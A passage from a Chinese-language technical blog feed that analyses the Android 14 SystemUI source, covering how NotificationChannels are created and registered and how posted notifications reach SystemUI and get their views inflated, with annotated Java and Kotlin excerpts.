class="name">xliff:g</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">xliff:g</span> <span class="attr">id</span>=<span class="string">&quot;id&quot;</span>&gt;</span>@string/status_bar_ime<span class="tag">&lt;/<span class="name">xliff:g</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">xliff:g</span> <span class="attr">id</span>=<span class="string">&quot;id&quot;</span>&gt;</span>@string/status_bar_sync_failing<span class="tag">&lt;/<span class="name">xliff:g</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">xliff:g</span> <span class="attr">id</span>=<span class="string">&quot;id&quot;</span>&gt;</span>@string/status_bar_sync_active<span class="tag">&lt;/<span class="name">xliff:g</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    ................</span><br><span class="line"><span class="tag">&lt;/<span class="name">string-array</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后是 <strong>StatusBarIconControllerImpl.java</strong> 这个控制器来控制 icon 的加载显示和移除。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 14 NotificationChannels与Notification的加载流程</title>
      <link href="/2024/01/27/2024-01-27/"/>
      <url>/2024/01/27/2024-01-27/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这部分我觉得三方应用使用的较多，分析的时候也是源码与三方应用结合分析的。</p><h3 id="一-NotificationChannel-的创建"><a href="#一-NotificationChannel-的创建" class="headerlink" title="一. NotificationChannel 的创建"></a>一. NotificationChannel 的创建</h3><p>在源码中，我看到了一个很怪的类：NotificationChannels.java。这个类继承了 CoreStartable。</p><blockquote><p>注：CoreStartable 就是 SystemUI，只是我这的源码的命名不一样，下面为了便于他人阅读，就以 SystemUI 来叫。</p></blockquote><p>NotificationChannels.java 就百十行代码，很简单，一起看看这个类：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/util/NotificationChannels.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NotificationChannels</span> <span class="keyword">extends</span> <span class="title class_">CoreStartable</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 省略代码</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">createAll</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">NotificationManager</span> <span class="variable">nm</span> <span class="operator">=</span> context.getSystemService(NotificationManager.class);</span><br><span class="line">        <span class="comment">// 创建通道</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">NotificationChannel</span> <span class="variable">batteryChannel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationChannel</span>(BATTERY,</span><br><span class="line">                context.getString(R.string.notification_channel_battery),</span><br><span class="line">                NotificationManager.IMPORTANCE_MAX);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">soundPath</span> <span class="operator">=</span> Settings.Global.getString(context.getContentResolver(),</span><br><span class="line">                Settings.Global.LOW_BATTERY_SOUND);</span><br><span class="line">        batteryChannel.setSound(Uri.parse(<span class="string">&quot;file://&quot;</span> + soundPath), <span class="keyword">new</span> <span class="title class_">AudioAttributes</span>.Builder()</span><br><span class="line">                .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)</span><br><span class="line">                .setUsage(AudioAttributes.USAGE_NOTIFICATION_EVENT)</span><br><span class="line">                .build());</span><br><span class="line">        batteryChannel.setBlockable(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 创建通道</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">NotificationChannel</span> <span class="variable">alerts</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationChannel</span>(</span><br><span class="line">                ALERTS,</span><br><span class="line">                context.getString(R.string.notification_channel_alerts),</span><br><span class="line">                NotificationManager.IMPORTANCE_HIGH);</span><br><span class="line">        <span class="comment">// 创建通道</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">NotificationChannel</span> <span class="variable">general</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationChannel</span>(</span><br><span class="line">                GENERAL,</span><br><span class="line">                context.getString(R.string.notification_channel_general),</span><br><span class="line">                NotificationManager.IMPORTANCE_MIN);</span><br><span class="line">        <span class="comment">// 创建通道</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">NotificationChannel</span> <span class="variable">storage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationChannel</span>(</span><br><span class="line">                STORAGE,</span><br><span class="line">                context.getString(R.string.notification_channel_storage),</span><br><span class="line">                isTv(context)</span><br><span class="line">                        ? NotificationManager.IMPORTANCE_DEFAULT</span><br><span class="line">                        : NotificationManager.IMPORTANCE_LOW);</span><br><span class="line">        <span class="comment">// 创建通道</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">NotificationChannel</span> <span class="variable">hint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationChannel</span>(</span><br><span class="line">                HINTS,</span><br><span class="line">                context.getString(R.string.notification_channel_hints),</span><br><span class="line">                NotificationManager.IMPORTANCE_DEFAULT);</span><br><span class="line">        <span class="comment">// No need to bypass DND.</span></span><br><span class="line">        <span class="comment">// 注册通道</span></span><br><span class="line">        nm.createNotificationChannels(Arrays.asList(</span><br><span class="line">                alerts,</span><br><span class="line">                general,</span><br><span class="line">                storage,</span><br><span class="line">                createScreenshotChannel(</span><br><span class="line">                        context.getString(R.string.notification_channel_screenshot),</span><br><span class="line">                        nm.getNotificationChannel(SCREENSHOTS_LEGACY)),</span><br><span class="line">                batteryChannel,</span><br><span class="line">                hint</span><br><span class="line">        ));</span><br><span class="line">        <span class="comment">// Delete older SS channel if present.</span></span><br><span class="line">        <span class="comment">// Screenshots promoted to heads-up in P, this cleans up the lower priority channel from O.</span></span><br><span class="line">        <span class="comment">// This line can be deleted in Q.</span></span><br><span class="line">        nm.deleteNotificationChannel(SCREENSHOTS_LEGACY);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (isTv(context)) &#123;</span><br><span class="line">            <span class="comment">// TV specific notification channel for TV PIP controls.</span></span><br><span class="line">            <span class="comment">// Importance should be &#123;@link NotificationManager#IMPORTANCE_MAX&#125; to have the highest</span></span><br><span class="line">            <span class="comment">// priority, so it can be shown in all times.</span></span><br><span class="line">            <span class="comment">// 注册通道</span></span><br><span class="line">            nm.createNotificationChannel(<span class="keyword">new</span> <span class="title class_">NotificationChannel</span>(</span><br><span class="line">                    TVPIP,</span><br><span class="line">                    context.getString(R.string.notification_channel_tv_pip),</span><br><span class="line">                    NotificationManager.IMPORTANCE_MAX));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Set up screenshot channel, respecting any previously committed user settings on legacy</span></span><br><span class="line"><span class="comment">     * channel.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@VisibleForTesting</span> <span class="keyword">static</span> NotificationChannel <span class="title function_">createScreenshotChannel</span><span class="params">(</span></span><br><span class="line"><span class="params">            String name, NotificationChannel legacySS)</span> &#123;</span><br><span class="line">        <span class="type">NotificationChannel</span> <span class="variable">screenshotChannel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationChannel</span>(SCREENSHOTS_HEADSUP,</span><br><span class="line">                name, NotificationManager.IMPORTANCE_HIGH); <span class="comment">// pop on screen</span></span><br><span class="line">        screenshotChannel.setSound(<span class="literal">null</span>, <span class="comment">// silent</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">AudioAttributes</span>.Builder().setUsage(AudioAttributes.USAGE_NOTIFICATION).build());</span><br><span class="line">        screenshotChannel.setBlockable(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (legacySS != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Respect any user modified fields from the old channel.</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">userlock</span> <span class="operator">=</span> legacySS.getUserLockedFields();</span><br><span class="line">            <span class="keyword">if</span> ((userlock &amp; NotificationChannel.USER_LOCKED_IMPORTANCE) != <span class="number">0</span>) &#123;</span><br><span class="line">                screenshotChannel.setImportance(legacySS.getImportance());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((userlock &amp; NotificationChannel.USER_LOCKED_SOUND) != <span class="number">0</span>)  &#123;</span><br><span class="line">                screenshotChannel.setSound(legacySS.getSound(), legacySS.getAudioAttributes());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((userlock &amp; NotificationChannel.USER_LOCKED_VIBRATION) != <span class="number">0</span>)  &#123;</span><br><span class="line">               screenshotChannel.setVibrationPattern(legacySS.getVibrationPattern());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((userlock &amp; NotificationChannel.USER_LOCKED_LIGHTS) != <span class="number">0</span>)  &#123;</span><br><span class="line">                screenshotChannel.setLightColor(legacySS.getLightColor());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// skip show_badge, irrelevant for system channel</span></span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> screenshotChannel;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">        createAll(mContext);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isTv</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="type">PackageManager</span> <span class="variable">packageManager</span> <span class="operator">=</span> context.getPackageManager();</span><br><span class="line">        <span class="keyword">return</span> packageManager.hasSystemFeature(PackageManager.FEATURE_LEANBACK);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NotificationChannels 扩展自 SystemUI 并重写了 <strong>start()</strong> 方法，它执行了 <strong>createAll()</strong> 方法，创建了通知通道有 batteryChannel（电池）、alerts（提醒）、storage（存储空间）、screenshot（屏幕截图）、hint （提示）、general（常规消息）。<br>此外，如果是 TV 设备的话还会创建画中画通知通道。</p><blockquote><ul><li>怪在哪呢：为什么在这个类去创建注册那些通知通道，而且并没有提示消息什么的，意义在哪？</li><li>注：下面我把该类当作三方应用。</li></ul></blockquote><p>下面围绕 NotificationChannels 一步一步的分析，上面调用 <strong>new NotificationChannel()</strong> 创建通知通道，然后 调用 <strong>nm.createNotificationChannels()</strong> 方法注册通道。<br>nm 其实是 NotificationManager 的对象，这样就转到了 NotificationManager 中。这里我作了一个流程图：<br><img src="/images/20240127/20240127001.png"></p><p>从 NotificationManager.createNotificationChannel() 到 NotificationManagerService.createNotificationChannelsImpl() 都是正常流程，也好理解。创建的关键代码在 <strong>mPreferencesHelper.createNotificationChannel()</strong> 中，具体如下：<br><strong>frameworks/base/services/core/java/com/android/server/notification/PreferencesHelper.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">createNotificationChannel</span><span class="params">(String pkg, <span class="type">int</span> uid, NotificationChannel channel,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> fromTargetApp, <span class="type">boolean</span> hasDndAccess)</span> &#123;</span><br><span class="line">    Objects.requireNonNull(pkg);</span><br><span class="line">    Objects.requireNonNull(channel);</span><br><span class="line">    Objects.requireNonNull(channel.getId());</span><br><span class="line">    Preconditions.checkArgument(!TextUtils.isEmpty(channel.getName()));</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">needsPolicyFileChange</span> <span class="operator">=</span> <span class="literal">false</span>, wasUndeleted = <span class="literal">false</span>, needsDndChange = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">synchronized</span> (mPackagePreferences) &#123;</span><br><span class="line">        <span class="type">PackagePreferences</span> <span class="variable">r</span> <span class="operator">=</span> getOrCreatePackagePreferencesLocked(pkg, uid);</span><br><span class="line">        <span class="keyword">if</span> (r == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid package&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (channel.getGroup() != <span class="literal">null</span> &amp;&amp; !r.groups.containsKey(channel.getGroup())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;NotificationChannelGroup doesn&#x27;t exist&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (NotificationChannel.DEFAULT_CHANNEL_ID.equals(channel.getId())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Reserved id&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 前面是各种条件检查，下面这行是关键点，先检索这个 channel 是否已经存在，以 channel id 为标志位。</span></span><br><span class="line">        <span class="type">NotificationChannel</span> <span class="variable">existing</span> <span class="operator">=</span> r.channels.get(channel.getId());</span><br><span class="line">        <span class="comment">// 如果通道已经存在就更新通道</span></span><br><span class="line">        <span class="comment">//  更新通道保留大部分已存在的设置，只更新了 name，description 等几项</span></span><br><span class="line">        <span class="keyword">if</span> (existing != <span class="literal">null</span> &amp;&amp; fromTargetApp) &#123;</span><br><span class="line">             <span class="comment">// 省略部分代码......</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="comment">// 省略部分代码......</span></span><br><span class="line">            <span class="comment">// channel 未创建过，把用户创建的 channel 加入到系统的 cache 里</span></span><br><span class="line">            r.channels.put(channel.getId(), channel);</span><br><span class="line">            <span class="keyword">if</span> (channel.canBypassDnd() != mAreChannelsBypassingDnd) &#123;</span><br><span class="line">                needsDndChange = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            MetricsLogger.action(getChannelLog(channel, pkg).setType(</span><br><span class="line">                    com.android.internal.logging.nano.MetricsProto.MetricsEvent.TYPE_OPEN));</span><br><span class="line">            mNotificationChannelLogger.logNotificationChannelCreated(channel, uid, pkg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (needsDndChange) &#123;</span><br><span class="line">        updateChannelsBypassingDnd();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> needsPolicyFileChange;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，一个通知完整的创建完成。<br>其实通过mPreferencesHelper.createNotificationChannel() 方法还能看出 NotificationChannel 一旦创建，那么能更改的东西就很少了（只有名字，描述，blocksystem，以及优先级），而 blocksystem 属性只有在系统源码里面才能使用（hide）；</p><p>NotificationChannel 不会重复创建。</p><blockquote><p>Android官方是这么解释这个设计的：NotificationChannel 就像是开发者送给用户的一个精美礼物，一旦送出去，控制权就在用户那里了。即使用户把通知铃声设置成《江南style》，你可以知道，但不可以更改。</p></blockquote><h3 id="二-Notification-的显示过程"><a href="#二-Notification-的显示过程" class="headerlink" title="二. Notification 的显示过程"></a>二. Notification 的显示过程</h3><p>这里代码有点多，我制作了一个通知传递的方法调用流程图：</p><p><img src="/images/20240127/20240127002.png"></p><p>上述流程图中，我们可能更比较关注 NotificationManagerService 是怎么与 SystemUI 交互的。<br>其实SystemUI向 NotificationManagerService 注册一个”服务”(一个Binder)。这个”服务”就相当于客户端 SystemUI 在服务端 NotificationManagerService 注册的一个回调。当有通知来临的时候，就会通过这个”服务”通知SystemUI，这个注册是在 <strong>StatusBar#setUpPresenter()</strong> 中完成的：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/CentralSurfacesImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setUpPresenter</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......  </span></span><br><span class="line">    <span class="comment">// 这位置调用了NotificationsControllerImpl#initialize()的方法</span></span><br><span class="line">    mNotificationsController.initialize(</span><br><span class="line">            mPresenter,</span><br><span class="line">            mNotifListContainer,</span><br><span class="line">            mStackScrollerController.getNotifStackController(),</span><br><span class="line">            mNotificationActivityStarter,</span><br><span class="line">            mCentralSurfacesComponent.getBindRowCallback());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <strong>NotificationsControllerImpl#initialize()</strong> 中进行注册：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/notification/init/NotificationsControllerImpl.kt</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">override fun <span class="title function_">initialize</span><span class="params">(</span></span><br><span class="line"><span class="params">    presenter: NotificationPresenter,</span></span><br><span class="line"><span class="params">    listContainer: NotificationListContainer,</span></span><br><span class="line"><span class="params">    stackController: NotifStackController,</span></span><br><span class="line"><span class="params">    notificationActivityStarter: NotificationActivityStarter,</span></span><br><span class="line"><span class="params">    bindRowCallback: NotificationRowBinderImpl.BindRowCallback</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">// 注册回调</span></span><br><span class="line">    notificationListener.registerAsSystemService()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述注册了之后，每当有通知来时就会回调到：<strong>NotificationListener#onNotificationPosted()</strong> 中，接着就会到 NotificationEntryManager中。<br>下面分析通知视图的加载，这里就直接从 <strong>NotificationEntryManager#onNotificationPosted()</strong> 开始。<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/notification/collection/coalescer/GroupCoalescer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">NotificationHandler</span> <span class="variable">mNotifListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationHandler</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNotificationPosted</span><span class="params">(StatusBarNotification sbn, RankingMap rankingMap)</span> &#123;</span><br><span class="line">        maybeEmitBatch(sbn);</span><br><span class="line">        applyRanking(rankingMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">shouldCoalesce</span> <span class="operator">=</span> handleNotificationPosted(sbn, rankingMap);</span><br><span class="line">        <span class="comment">// 通过key值进行判断，通知是否已存在</span></span><br><span class="line">        <span class="keyword">if</span> (shouldCoalesce) &#123;</span><br><span class="line">            mLogger.logEventCoalesced(sbn.getKey());</span><br><span class="line">            mHandler.onNotificationRankingUpdate(rankingMap);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            mHandler.onNotificationPosted(sbn, rankingMap);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上述源码可以知道，通知到后，首先会进行判断该通知是否存在，存在则刷新，不存在则添加；这里以添加为例去分析。</p><p>先看两张图，可以知道下面分析的方向：</p><p><strong>SystemUI组件思维导图</strong>:<br><img src="/images/20240127/20240127003.png"><br><strong>SystemUI 关键布局图</strong><br><img src="/images/20240127/20240127004.png"></p><p><strong>根布局</strong>：super_status_bar.xml,<br><strong>顶上状态栏</strong>： status_bar.xml, 通过CollapsedStatusBarFragment.java加载；PhoneStatusBarView(FrameLayout,)是里面的父控件; 对应 R.id.status_bar_container 。<br><strong>下拉状态栏</strong>：（包括通知为status_bar_expanded.xml）,最外层布局NotificationPanelView；qs_frame.xml 为下拉后的状态栏部分(用QSFragment管理，布局控件为QSContainerImpl)，其高度更新在QSContainerImpl.java中；<br><strong>NotificationStackScrollLayout</strong>: 用于下拉的通知的相关问题(占满全屏，包括导航栏，会处理点击状态栏空白区的逻辑)。</p><blockquote><p>NotificationStackScrollLayout：是一个滑动布局，里面嵌套着 ExpandableNotificationRow ，即通知。</p></blockquote><p>接着上面分析：上面我们只关注 addNotification(sbn, rankingMap) ，而它内部时调用 addNotificationInternal() 方法实现的。<br><strong>NotificationEntryManager#addNotificationInternal()</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NotificationEntryManager.java</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">addNotificationInternal</span><span class="params">(</span></span><br><span class="line"><span class="params">        StatusBarNotification notification,</span></span><br><span class="line"><span class="params">        RankingMap rankingMap)</span> <span class="keyword">throws</span> InflationException &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 省略部分代码 ...</span></span><br><span class="line">    <span class="type">NotificationEntry</span> <span class="variable">entry</span> <span class="operator">=</span> mPendingNotifications.get(key);</span><br><span class="line">    <span class="comment">// 省略部分代码 ...</span></span><br><span class="line">    <span class="comment">// 构造视图</span></span><br><span class="line">    <span class="keyword">if</span> (!mFeatureFlags.isNewNotifPipelineRenderingEnabled()) &#123;</span><br><span class="line">        <span class="comment">// NotificationRowBinderImpl 为 NotificationRowBinder 的实现类</span></span><br><span class="line">        mNotificationRowBinderLazy.get().inflateViews(entry, <span class="literal">null</span>, mInflationCallback);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略部分代码 ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先为通知创建一个 NotificationEntry 通知实例，然后再通过 NotificationRowBinderImpl 中的 inflateViews() 加载通知视图，绑定通知信息，并在通知栏添加通知视图，以及在状态栏添加通知图标。<br><strong>NotificationRowBinderImpl#inflateViews()</strong><br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/notification/collection/inflation/NotificationRowBinderImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inflateViews</span><span class="params">(</span></span><br><span class="line"><span class="params">        NotificationEntry entry,</span></span><br><span class="line"><span class="params">        NotifInflater.Params params,</span></span><br><span class="line"><span class="params">        NotificationRowContentBinder.InflationCallback callback)</span></span><br><span class="line">        <span class="keyword">throws</span> InflationException &#123;</span><br><span class="line">    <span class="keyword">if</span> (params == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// weak assert that the params should always be passed in the new pipeline</span></span><br><span class="line">        mNotifPipelineFlags.checkLegacyPipelineEnabled();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取查看父布局</span></span><br><span class="line">    <span class="type">ViewGroup</span> <span class="variable">parent</span> <span class="operator">=</span> mListContainer.getViewParentForNotification(entry);</span><br><span class="line">    <span class="comment">// 通知是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (entry.rowExists()) &#123;</span><br><span class="line">        mIconManager.updateIcons(entry);</span><br><span class="line">        <span class="type">ExpandableNotificationRow</span> <span class="variable">row</span> <span class="operator">=</span> entry.getRow();</span><br><span class="line">        row.reset();</span><br><span class="line">        updateRow(entry, row);</span><br><span class="line">        inflateContentViews(entry, params, row, callback);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 创建图标</span></span><br><span class="line">        mIconManager.createIcons(entry);</span><br><span class="line">        